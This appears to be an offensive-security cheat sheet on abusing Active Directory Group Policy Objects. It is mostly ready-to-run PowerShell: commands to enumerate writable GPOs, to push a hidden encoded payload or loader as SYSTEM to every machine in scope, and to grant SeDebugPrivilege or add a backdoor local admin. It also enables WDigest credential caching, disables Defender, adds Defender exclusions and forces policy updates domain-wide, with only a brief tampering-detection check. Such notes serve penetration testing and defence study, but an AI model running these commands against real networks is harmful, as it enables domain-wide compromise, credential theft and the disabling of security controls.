# GPO Abuse — Enterprise-Wide Persistence & Lateral Movement

**Why GPO abuse matters:** A single compromised Group Policy Object can push commands to every computer in an OU — potentially thousands of machines. If you have **CreateChild or GenericWrite on a GPO** linked to a critical OU, you have lateral movement to all machines in that scope.

---

## Step 1: Enumerate GPO Permissions

```powershell
# List all GPOs and their permissions:
Get-GPO -All | ForEach-Object {Get-GPPermissions -Guid $_.Id -All} | Where-Object {$_.Permission -match "GpoEditDeleteModifySecurity|GpoEdit"}

# PowerView — find GPOs where you have write access:
Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|GenericAll|GenericWrite|WriteProperty"} | Where-Object {$_.IdentityReference -match "targetuser"}

# Find which OUs a GPO is linked to:
Get-DomainGPO -Identity "<GPO_NAME>" | Select displayname, gpcfilesyspath
Get-DomainOu | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectDN -match "OU"}

# BloodHound: "Find GPOs controllable by domain users"
# Look for: WriteGPLink edges on OUs, GenericWrite → GPO
```

---

## Method 1: Immediate Scheduled Task via PowerShell (New-GPOImmediateTask)

This is the most reliable method. Creates a scheduled task that fires immediately on all computers in the GPO's scope — no waiting for next group policy refresh.

```powershell
# Import the GPO module:
Import-Module GroupPolicy

# Push a reverse shell as SYSTEM to all machines in the GPO scope:
# (Requires "modify" permissions on the GPO)
New-GPOImmediateTask -TaskName "WindowsUpdate" `
    -GPODisplayName "Default Domain Policy" `
    -CommandArguments "/c powershell -w hidden -enc PAYLOAD_B64" `
    -Command "cmd.exe" `
    -Force

# One-liner — creates an "immediate" task that runs on next GPO refresh:
New-GPOImmediateTask -TaskName "svc_update" `
    -GPODisplayName "Desktop Policy" `
    -CommandArguments "/c C:\Windows\Temp\loader.exe" `
    -Command "cmd.exe" `
    -Force `
    -RunAs "NT AUTHORITY\SYSTEM"

# Force immediate application on all targets (requires appropriate rights):
Invoke-GPUpdate -Computer TARGET -Force -RandomDelayInMinutes 0

# Or wait — GPO refreshes every 90 minutes by default
```

---

## Method 2: Modify GptTmpl.inf — Add Privilege

Modify the GPO's security template to grant SeDebugPrivilege or add users to local admin groups enterprise-wide.

```powershell
# Find the GPO's SYSVOL path:
Get-DomainGPO -Identity "Default Domain Policy" | Select gpcfilesyspath
# Output: \\corp.com\SysVol\corp.com\Policies\{GUID}\

# Edit the GptTmpl.inf (if writable):
$gptPath = "\\corp.com\SysVol\corp.com\Policies\{GUID}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

# Read current content:
Get-Content $gptPath

# Add SeDebugPrivilege to everyone:
# Find the [Privilege Rights] section and add:
# SeDebugPrivilege = *S-1-5-11,*S-1-5-32-544
# Where S-1-5-11 = Authenticated Users, S-1-5-32-544 = Administrators

# Add your user to local Administrators group:
# Find [Group Membership] section and add:
# *S-1-5-32-544__Members = *S-1-5-21-xxx-1001  ← your user SID

# Increment GPO version (required to trigger update — CRITICAL STEP):
# Edit \\corp.com\SysVol\corp.com\Policies\{GUID}\gpt.ini
# Increment: Version=X to Version=X+1  (even = machine, odd = user)
```

---

## Method 3: Registry.pol — Push Registry Changes via GPO

Control registry values on all computers in scope — useful for enabling WDigest, disabling Defender, modifying LSA settings.

```powershell
# Enable WDigest on all machines in GPO scope:
# Manually edit or use PowerShell's Set-GPRegistryValue:
Set-GPRegistryValue -Name "Default Domain Policy" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -ValueName "UseLogonCredential" `
    -Type DWord `
    -Value 1

# Disable Windows Defender Real-Time Protection (GPO):
Set-GPRegistryValue -Name "Desktop Policy" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -ValueName "DisableAntiSpyware" `
    -Type DWord `
    -Value 1

# Add Defender exclusion path:
Set-GPRegistryValue -Name "Desktop Policy" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" `
    -ValueName "C:\Windows\Temp" `
    -Type String `
    -Value 0
```

---

## Method 4: Force Immediate GPO Application

```powershell
# Force on a specific target (WinRM required):
Invoke-Command -ComputerName TARGET -ScriptBlock {gpupdate /force}

# Force on all computers via AD:
Get-DomainComputer | ForEach-Object { Invoke-GPUpdate -Computer $_.name -Force -RandomDelayInMinutes 0 }

# From cmd (locally on target):
gpupdate /force

# Via PsExec (no WinRM):
.\PsExec.exe \\TARGET gpupdate /force
```

---

## Method 5: GPO Link Abuse

If you can LINK a GPO (you don't need to modify the GPO itself):

```powershell
# Link an existing GPO with a malicious scheduled task to a new OU:
New-GPLink -Name "Existing-Malicious-GPO" -Target "OU=Computers,DC=corp,DC=com"

# Check who can link GPOs to OUs:
Get-DomainOu -Properties gplink,ntsecuritydescriptor | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty" -and $_.ObjectAceType -match "GP-Link"}
```

---

## Detection Check

```powershell
# From attacker perspective — check if you have GPO rights:
Get-DomainGPO | Get-ObjectAcl | Where-Object {$_.IdentityReference -match $env:USERNAME}

# BloodHound query: "Find Computers where Domain Users can Modify the GPO"
# This highlights direct paths without needing DA

# Audit: check GPO version numbers (SYSVOL gpt.ini):
Get-Content "\\corp.com\SysVol\corp.com\Policies\{GUID}\gpt.ini"
# Unexpected version bumps = indicator of tampering
```

---

## Quick Win: Add Local Admin via GPO (Restricted Groups)

```
# Edit the GPO in Group Policy Editor (gpmc.msc) manually if you have console access:
# Computer Configuration → Policies → Windows Settings → Security Settings
# → Restricted Groups → Add Group: Administrators
# → Members: Add your user / new backdoor account
# This adds your user to local Administrators on ALL computers in scope
```

---

## Summary: Attack Paths by Permission

| You Have | Attack Path |
|----------|------------|
| GenericWrite on GPO | New-GPOImmediateTask → SYSTEM shell on all machines |
| WriteProperty on GPO | Edit GptTmpl.inf → Grant SeDebugPrivilege |
| WriteGPLink on OU | Link malicious GPO to target OU |
| GenericAll on OU | Create + link new GPO to OU |
| DA (already) | All of the above + direct GPO edit |
